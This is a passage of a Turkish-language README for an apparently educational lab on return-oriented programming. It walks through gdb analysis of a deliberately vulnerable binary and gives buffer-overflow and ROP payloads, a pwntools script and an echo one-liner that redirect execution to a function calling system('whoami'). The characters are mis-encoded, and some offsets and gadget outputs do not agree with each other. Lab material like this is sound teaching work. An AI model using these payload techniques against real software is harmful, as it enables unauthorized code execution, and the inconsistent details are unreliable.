(gdb) break vulnerable_function if $rsp == 0x7fffffffe000
(gdb) break execute_whoami if $rdi == 0x401220

# Watchpoint'ler
(gdb) watch *0x7fffffffe048
(gdb) watch $rsp+0x48

# TUI modunda analiz
(gdb) layout asm
(gdb) layout regs
(gdb) layout split

# Script ile otomatik analiz
(gdb) define analyze_rop
> break vulnerable_function
> run
> x/32gx $rsp
> x/gx $rsp+0x48
> continue
> end
(gdb) analyze_rop
```

#### 2.7. ROP Chain Debugging
```bash
# ROP chain'i adÄ±m adÄ±m debug et
(gdb) break vulnerable_function
(gdb) run
# Payload'Ä± gir
(gdb) x/32gx $rsp
(gdb) x/gx $rsp+0x48
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

#### 2.8. Exploit DoÄŸrulama
```bash
# Exploit'in Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol et
(gdb) break execute_whoami
(gdb) run
# Payload'Ä± gir
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers
(gdb) continue
```

#### 2.9. GDB Script Ã–rnekleri
```bash
# ROP analizi iÃ§in GDB script
(gdb) define rop_analysis
> echo === ROP Analysis Started ===\n
> break vulnerable_function
> run
> echo === Stack State ===\n
> x/32gx $rsp
> echo === Return Address ===\n
> x/gx $rsp+0x48
> echo === Buffer Content ===\n
> x/32gx $rsp+0x8
> echo === Analysis Complete ===\n
> end

# Gadget test script
(gdb) define test_gadgets
> echo === Testing Gadgets ===\n
> break gadget_pop_rdi
> run
> x/32gx $rsp
> stepi
> info registers
> break gadget_pop_rsi
> continue
> x/32gx $rsp
> stepi
> info registers
> end
```

#### 2.10. Hata AyÄ±klama Teknikleri
```bash
# Segmentation fault analizi
(gdb) run
# Program crash olduÄŸunda
(gdb) bt
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Stack corruption kontrolÃ¼
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 3. Zafiyet Tespiti ve Analizi

#### 3.1. Buffer Overflow Zafiyeti - DetaylÄ± Analiz
```bash
# 1. ADIM: vulnerable_function'da breakpoint koy
(gdb) break vulnerable_function
(gdb) run

# 2. ADIM: Stack durumunu incele
(gdb) x/32gx $rsp
# Ã‡IKTI Ã–RNEÄÄ°:
# 0x7fffffffe000: 0x0000000000000000  0x00007fffffffe100
# 0x7fffffffe010: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe020: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe030: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe040: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe050: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe060: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe070: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe080: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe090: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0a0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0b0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0c0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0d0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0e0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0f0: 0x0000000000000000  0x0000000000000000

# 3. ADIM: Return address'i bul
(gdb) x/gx $rsp+0x48
# Ã‡IKTI Ã–RNEÄÄ°: 0x7fffffffe048: 0x0000000000401471
# YORUM: Bu deÄŸer main fonksiyonundan dÃ¶nÃ¼ÅŸ adresi. Bu deÄŸeri deÄŸiÅŸtirmemiz gerekiyor.

# 4. ADIM: Buffer'Ä±n baÅŸlangÄ±Ã§ adresini bul
(gdb) x/gx $rsp+0x8
# Ã‡IKTI Ã–RNEÄÄ°: 0x7fffffffe008: 0x0000000000000000
# YORUM: Buffer bu adreste baÅŸlÄ±yor. 64 byte boyutunda.

# 5. ADIM: Stack layout'Ä±nÄ± anla
# +------------------+ <- $rsp + 0x48 (72 bytes) - RETURN ADDRESS
# | 0x0000000000401471| <- Bu deÄŸeri execute_whoami ile deÄŸiÅŸtireceÄŸiz
# +------------------+ <- $rsp + 0x40 (64 bytes) - SAVED RBP
# | 0x0000000000000000| <- Bu deÄŸer korunacak
# +------------------+ <- $rsp + 0x8 (0-63 bytes) - BUFFER[64]
# | 0x0000000000000000| <- Buraya 72 byte 'A' yazacaÄŸÄ±z
# | 0x0000000000000000| <- Buffer devam ediyor...
# | 0x0000000000000000| <- ...64 byte'a kadar
# +------------------+ <- $rsp + 0x0 - FUNCTION ARGS
# | 0x0000000000000000| <- Function arguments

# 6. ADIM: Buffer overflow testi
(gdb) run
# Payload gir: 72 byte 'A' + execute_whoami adresi
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# 7. ADIM: Return address'in deÄŸiÅŸip deÄŸiÅŸmediÄŸini kontrol et
(gdb) x/gx $rsp+0x48
# Ã‡IKTI Ã–RNEÄÄ°: 0x7fffffffe048: 0x0000000000401220
# YORUM: âœ… BAÅARILI! Return address execute_whoami (0x401220) ile deÄŸiÅŸti.
# EÄŸer hala 0x401471 ise, payload yanlÄ±ÅŸ veya offset hatalÄ±.
```

#### 3.2. ROP Gadget Analizi - DetaylÄ± Ä°nceleme
```bash
# 1. ADIM: Gadget fonksiyonlarÄ±nÄ± disassemble et
(gdb) disassemble gadget_pop_rdi
# Ã‡IKTI:
# 0x0000000000401323 <+0>:	push   %rbp
# 0x0000000000401324 <+1>:	mov    %rsp,%rbp
# 0x0000000000401327 <+4>:	movl   $0x0,-0x4(%rbp)
# 0x000000000040132e <+11>:	mov    -0x4(%rbp),%eax
# 0x0000000000401331 <+14>:	add    $0x1,%eax
# 0x0000000000401334 <+17>:	mov    %eax,-0x4(%rbp)
# 0x0000000000401337 <+20>:	nop
# 0x0000000000401338 <+21>:	pop    %rbp
# 0x0000000000401339 <+22>:	ret
# YORUM: âŒ Bu sadece dummy fonksiyon! GerÃ§ek pop rdi; ret yok.
#        Sadece push rbp, mov rsp,rbp, nop, pop rbp, ret yapÄ±yor.

# 2. ADIM: ROPgadget ile gerÃ§ek gadget'larÄ± bul
# Terminal'de Ã§alÄ±ÅŸtÄ±r:
ROPgadget --binary compiled/vulnerable_code --ropchain
# Ã‡IKTI:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c  
# pop rdx; ret: 0x401395
# syscall: 0x40139e

# 3. ADIM: GerÃ§ek gadget'larÄ± GDB'de incele
(gdb) x/5i 0x401383
# Ã‡IKTI:
# 0x401383: pop    %rdi
# 0x401384: ret
# YORUM: âœ… BU GERÃ‡EK GADGET! RDI register'Ä±na stack'ten deÄŸer alÄ±r.

(gdb) x/5i 0x40138c
# Ã‡IKTI:
# 0x40138c: pop    %rsi
# 0x40138d: ret
# YORUM: âœ… BU GERÃ‡EK GADGET! RSI register'Ä±na stack'ten deÄŸer alÄ±r.

(gdb) x/5i 0x401395
# Ã‡IKTI:
# 0x401395: pop    %rdx
# 0x401396: ret
# YORUM: âœ… BU GERÃ‡EK GADGET! RDX register'Ä±na stack'ten deÄŸer alÄ±r.

(gdb) x/5i 0x40139e
# Ã‡IKTI:
# 0x40139e: syscall
# YORUM: âœ… BU GERÃ‡EK SYSCALL! Sistem Ã§aÄŸrÄ±sÄ± yapar.

# 4. ADIM: Gadget'larÄ±n kullanÄ±mÄ±nÄ± anla
# pop rdi; ret (0x401383): RDI'ya deÄŸer yÃ¼kler (1. parametre)
# pop rsi; ret (0x40138c): RSI'ya deÄŸer yÃ¼kler (2. parametre)  
# pop rdx; ret (0x401395): RDX'ya deÄŸer yÃ¼kler (3. parametre)
# syscall (0x40139e): Sistem Ã§aÄŸrÄ±sÄ± yapar

# 5. ADIM: Gadget chain Ã¶rneÄŸi
# EÄŸer system("whoami") Ã§aÄŸÄ±rmak istiyorsak:
# 1. pop rdi; ret (0x401383) -> RDI'ya "whoami" string adresini yÃ¼kle
# 2. system@plt (0x401030) -> system fonksiyonunu Ã§aÄŸÄ±r
# 3. exit@plt (0x401060) -> ProgramÄ± sonlandÄ±r
```

#### 3.3. Hedef Fonksiyon Analizi - DetaylÄ± Ä°nceleme
```bash
# 1. ADIM: execute_whoami fonksiyonunu detaylÄ± incele
(gdb) disassemble execute_whoami
# Ã‡IKTI:
# 0x0000000000401220 <+0>:	push   %rbp
# 0x0000000000401221 <+1>:	mov    %rsp,%rbp
# 0x0000000000401224 <+4>:	sub    $0x10,%rsp
# 0x0000000000401228 <+8>:	lea    0xe89(%rip),%rax        # 0x4020b8
# 0x000000000040122f <+15>:	mov    %rax,%rsi
# 0x0000000000401232 <+18>:	lea    0x2e07(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# 0x0000000000401239 <+25>:	mov    %rax,%rdi
# 0x000000000040123c <+28>:	call   0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# 0x000000000040127e <+94>:	lea    0xe7d(%rip),%rax        # 0x402102
# 0x0000000000401285 <+101>:	mov    %rax,%rdi
# 0x0000000000401288 <+104>:	call   0x401030 <system@plt>
# 0x0000000000401319 <+249>:	mov    $0x0,%edi
# 0x000000000040131e <+254>:	call   0x401060 <exit@plt>

# YORUM: âœ… MÃœKEMMEL! Bu fonksiyon:
# - 0x401288: system("whoami") Ã§aÄŸÄ±rÄ±r
# - 0x40131e: exit(0) ile programÄ± sonlandÄ±rÄ±r
# - Bu yÃ¼zden sadece return address'i bu fonksiyonla deÄŸiÅŸtirmek yeterli!

# 2. ADIM: String adreslerini bul
(gdb) x/s 0x4020b8
# Ã‡IKTI: 0x4020b8: "Shellcode Enjeksiyonu Basarili!"
# YORUM: Bu mesaj yazdÄ±rÄ±lacak

(gdb) x/s 0x402102
# Ã‡IKTI: 0x402102: "whoami"
# YORUM: Bu string system() fonksiyonuna parametre olarak geÃ§ilecek

# 3. ADIM: win_function'Ä± incele
(gdb) disassemble win_function
# Ã‡IKTI:
# 0x0000000000401166 <+0>:	push   %rbp
# 0x0000000000401167 <+1>:	mov    %rsp,%rbp
# 0x0000000000401216 <+176>:	mov    $0x0,%edi
# 0x000000000040121b <+181>:	call   0x401060 <exit@plt>

# YORUM: âŒ Bu fonksiyon sadece mesaj yazdÄ±rÄ±r, komut Ã§alÄ±ÅŸtÄ±rmaz.
#        execute_whoami daha iyi Ã§Ã¼nkÃ¼ gerÃ§ek komut Ã§alÄ±ÅŸtÄ±rÄ±r.

# 4. ADIM: Fonksiyon adreslerini doÄŸrula
(gdb) x/gx execute_whoami
# Ã‡IKTI: 0x401220: 0x0000000000401220
# YORUM: âœ… execute_whoami adresi 0x401220

(gdb) x/gx win_function
# Ã‡IKTI: 0x401166: 0x0000000000401166
# YORUM: âœ… win_function adresi 0x401166

# 5. ADIM: Hangi fonksiyonu kullanacaÄŸÄ±mÄ±zÄ± belirle
# execute_whoami (0x401220) - Ã–NERÄ°LEN:
# âœ… system("whoami") Ã§aÄŸÄ±rÄ±r
# âœ… GerÃ§ek komut Ã§alÄ±ÅŸtÄ±rÄ±r
# âœ… KullanÄ±cÄ± adÄ±nÄ± gÃ¶sterir
# âœ… ProgramÄ± dÃ¼zgÃ¼n sonlandÄ±rÄ±r

# win_function (0x401166) - ALTERNATÄ°F:
# âŒ Sadece mesaj yazdÄ±rÄ±r
# âŒ Komut Ã§alÄ±ÅŸtÄ±rmaz
# âœ… ProgramÄ± dÃ¼zgÃ¼n sonlandÄ±rÄ±r
```

#### 3.4. Exploit Stratejisi - DetaylÄ± AÃ§Ä±klama
```bash
# STRATEJÄ° 1: Basit ROP Chain (Ã–NERÄ°LEN - Kolay)
# 1. ADIM: Buffer overflow (72 bytes)
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 2. ADIM: Return address'i execute_whoami ile deÄŸiÅŸtir
# \x20\x12\x40\x00\x00\x00\x00\x00
# 3. ADIM: execute_whoami otomatik olarak system("whoami") Ã§aÄŸÄ±rÄ±r

# NEDEN BU STRATEJÄ° DAHA Ä°YÄ°:
# âœ… Sadece 2 adÄ±m: Buffer overflow + Return address deÄŸiÅŸtirme
# âœ… execute_whoami zaten system("whoami") Ã§aÄŸÄ±rÄ±yor
# âœ… execute_whoami zaten exit(0) yapÄ±yor
# âœ… Ekstra gadget gerekmez
# âœ… Daha az hata yapma riski

# STRATEJÄ° 2: GeliÅŸmiÅŸ ROP Chain (Alternatif - Zor)
# 1. ADIM: Buffer overflow (72 bytes)
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 2. ADIM: pop rdi; ret gadget (0x401383)
# \x83\x13\x40\x00\x00\x00\x00\x00
# 3. ADIM: "whoami" string adresi (0x402102)
# \x02\x21\x40\x00\x00\x00\x00\x00
# 4. ADIM: system@plt adresi (0x401030)
# \x30\x10\x40\x00\x00\x00\x00\x00
# 5. ADIM: exit@plt adresi (0x401060)
# \x60\x10\x40\x00\x00\x00\x00\x00

# NEDEN BU STRATEJÄ° DAHA ZOR:
# âŒ 5 adÄ±m gerekiyor
# âŒ String adresini bulmak gerekiyor
# âŒ PLT adreslerini bulmak gerekiyor
# âŒ Daha fazla hata yapma riski
# âŒ Daha karmaÅŸÄ±k

# HANGÄ° STRATEJÄ°YÄ° SEÃ‡MELÄ°YÄ°M?
# EÄŸer sadece whoami komutunu Ã§alÄ±ÅŸtÄ±rmak istiyorsan: STRATEJÄ° 1
# EÄŸer ROP chain Ã¶ÄŸrenmek istiyorsan: STRATEJÄ° 2
# EÄŸer gerÃ§ek dÃ¼nyada farklÄ± komutlar Ã§alÄ±ÅŸtÄ±rmak istiyorsan: STRATEJÄ° 2
```

#### 3.5. Zafiyet DoÄŸrulama - AdÄ±m AdÄ±m Test
```bash
# 1. ADIM: execute_whoami'de breakpoint koy
(gdb) break execute_whoami
# Ã‡IKTI: Breakpoint 1 at 0x401220
# YORUM: âœ… Breakpoint baÅŸarÄ±yla koyuldu

# 2. ADIM: ProgramÄ± Ã§alÄ±ÅŸtÄ±r
(gdb) run
# Ã‡IKTI: 
# === CyberLabs ROP Vulnerability Laboratory ===
# Modul: Return-Oriented Programming Exploitation
# Seviye: Ileri
# ROP Vulnerability Lab - Buffer Overflow
# =======================================
# Giris yapin: 
# YORUM: âœ… Program Ã§alÄ±ÅŸÄ±yor, payload bekliyor

# 3. ADIM: Payload'Ä± gir
# Payload: 72 byte 'A' + execute_whoami adresi
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# 4. ADIM: Stack durumunu kontrol et
(gdb) x/32gx $rsp
# Ã‡IKTI Ã–RNEÄÄ°:
# 0x7fffffffe000: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe010: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe020: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe030: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe040: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe050: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe060: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe070: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe080: 0x4141414141414141  0x0000000000401220
# YORUM: âœ… Buffer overflow baÅŸarÄ±lÄ±! Return address 0x401220 (execute_whoami) oldu

# 5. ADIM: Return address'i doÄŸrula
(gdb) x/gx $rsp+0x48
# Ã‡IKTI: 0x7fffffffe048: 0x0000000000401220
# YORUM: âœ… MÃœKEMMEL! Return address execute_whoami ile deÄŸiÅŸti

# 6. ADIM: execute_whoami'ye geÃ§iÅŸ yap
(gdb) stepi
# Ã‡IKTI: Breakpoint 1, execute_whoami () at vulnerable_code.cpp:45
# YORUM: âœ… BAÅARILI! execute_whoami fonksiyonu Ã§aÄŸrÄ±ldÄ±

# 7. ADIM: Fonksiyonun Ã§alÄ±ÅŸmasÄ±nÄ± izle
(gdb) continue
# Ã‡IKTI:
# Shellcode Enjeksiyonu Basarili!
# 'whoami' komutu calistiriliyor...
# === WHOAMI KOMUTU CIKTISI ===
# alicangonullu
# =============================
# Komut basariyla calistirildi!
# ROP ile sistem komutu basariyla enjekte edildi!
# YORUM: âœ… MÃœKEMMEL! Exploit tamamen baÅŸarÄ±lÄ±!

# 8. ADIM: Program sonucunu kontrol et
# Program exit(0) ile sonlandÄ±
# YORUM: âœ… Program dÃ¼zgÃ¼n sonlandÄ±

# SONUÃ‡ DEÄERLENDÄ°RMESÄ°:
# âœ… Buffer overflow baÅŸarÄ±lÄ±
# âœ… Return address deÄŸiÅŸimi baÅŸarÄ±lÄ±  
# âœ… execute_whoami Ã§aÄŸrÄ±sÄ± baÅŸarÄ±lÄ±
# âœ… system("whoami") Ã§alÄ±ÅŸtÄ±rma baÅŸarÄ±lÄ±
# âœ… KullanÄ±cÄ± adÄ± gÃ¶sterildi (alicangonullu)
# âœ… Program dÃ¼zgÃ¼n sonlandÄ±
# âœ… ROP exploit tamamen baÅŸarÄ±lÄ±!
```

### 4. ROP Chain OluÅŸturma

#### Linux x86_64 iÃ§in:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain - sadece execute_whoami fonksiyonunu Ã§aÄŸÄ±r
payload += p64(0x401220)        # execute_whoami fonksiyonu

# Alternatif: GerÃ§ek ROP chain (geliÅŸmiÅŸ)
# payload += p64(0x401383)        # pop rdi; ret
# payload += p64(0x0)             # rdi deÄŸeri
# payload += p64(0x40138c)        # pop rsi; ret  
# payload += p64(0x0)             # rsi deÄŸeri
# payload += p64(0x401395)        # pop rdx; ret
# payload += p64(0x0)             # rdx deÄŸeri
# payload += p64(0x40139e)        # syscall
# payload += p64(0x401220)        # execute_whoami fonksiyonu
```

#### macOS ARM64 iÃ§in:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain (ARM64 farklÄ±)
payload += p64(whoami_addr)     # execute_whoami fonksiyonu
```

### 3. Exploit Ã‡alÄ±ÅŸtÄ±rma

```bash
# Exploit'i Ã§alÄ±ÅŸtÄ±r
python3 source_code/exploit.py

# Manuel test (Linux x86_64)
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code

# ROPgadget ile gadget'larÄ± bul
ROPgadget --binary compiled/vulnerable_code --ropchain

# Belirli gadget'larÄ± ara
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"
```

### 4. Beklenen SonuÃ§

```
Shellcode Enjeksiyonu Basarili!
'whoami' komutu calistiriliyor...
[kullanici_adi]
Komut basariyla calistirildi!

ROP ile sistem komutu basariyla enjekte edildi!
```

## Ä°leri Seviye Konular

- **ASLR Bypass:** Information leak ile ASLR'Ä± aÅŸma
- **Stack Pivot:** Stack pointer'Ä± manipÃ¼le etme
- **JOP (Jump-Oriented Programming):** ROP'un alternatifi
- **COP (Call-Oriented Programming):** Call instruction'larÄ± kullanma
- **ROP Chain Optimization:** Daha verimli chain'ler oluÅŸturma

## Kaynaklar

- [ROP Emporium](https://ropemporium.com/) - ROP Ã¶ÄŸrenme platformu
- [Phrack ROP Article](http://phrack.org/issues/58/4.html) - ROP'un temel makalesi
- [ROPgadget Documentation](https://github.com/JonathanSalwan/ROPgadget) - Gadget analiz aracÄ±
- [pwntools Documentation](https://docs.pwntools.com/) - Exploit geliÅŸtirme kÃ¼tÃ¼phanesi

## KatkÄ±da Bulunma

Bu laboratuvarÄ± geliÅŸtirmek iÃ§in:
1. Fork yapÄ±n
2. Yeni Ã¶zellik ekleyin
3. Pull request gÃ¶nderin

## Lisans

Bu proje MIT lisansÄ± altÄ±nda lisanslanmÄ±ÅŸtÄ±r.

## Ä°letiÅŸim

- **CyberLabs:** [GitHub](https://github.com/alicangonullu/CyberLabs)
- **E-posta:** alicangonullu@yahoo.com
- **Web:** https://alicangonullu.com
